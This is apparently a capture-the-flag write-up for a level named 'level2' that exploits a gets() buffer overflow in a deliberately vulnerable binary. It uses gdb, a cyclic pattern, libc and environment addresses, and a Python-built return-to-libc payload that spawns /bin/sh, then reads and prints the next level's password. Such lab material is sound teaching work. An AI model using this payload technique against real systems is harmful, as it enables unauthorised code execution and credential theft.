As seen in the disassembled code, the program uses the gets() function to take user input :

```
gdb ./level02
gdb disass p
```

but this time we also see that check ensures that the return address is not overwritten with an address on the stack:

To check for a buffer overflow, we input a large string exceeding 100 characters:
```
0x80484fb <p+39>:	and    eax,0xb0000000
0x8048500 <p+44>:	cmp    eax,0xb0000000
```


We will bypass this check using a return-to-libc exploit. First, we find the address of the system function in libc:
```
ldd ./level2 | grep libc
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
```
Next, we find the address of the ret instruction:
```
0x804853e <p+106>:	ret
```
We export the shell we want to use:
```
$ export SHELL=/bin/sh
```
Then, we write a small program to find the address of environment variables (available in ressoures).
```
$ gcc getenv.c -o getenv
$ ./getenv SHELL
SHELL is at 0xbffff935
```
We need to determine the offset at which the buffer overflows:
```
gdb> pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb> r < <(echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL')
gdb> pattern search
Registers contain pattern buffer:
EBP+0 found at offset: 76
EIP+0 found at offset: 80
```
Now, we prepare the payload:
```
$ python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "DUMM" + "\x35\xf9\xff\xbf"' > /tmp/payload2
$ cat /tmp/payload2 - | ./level2
$ cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```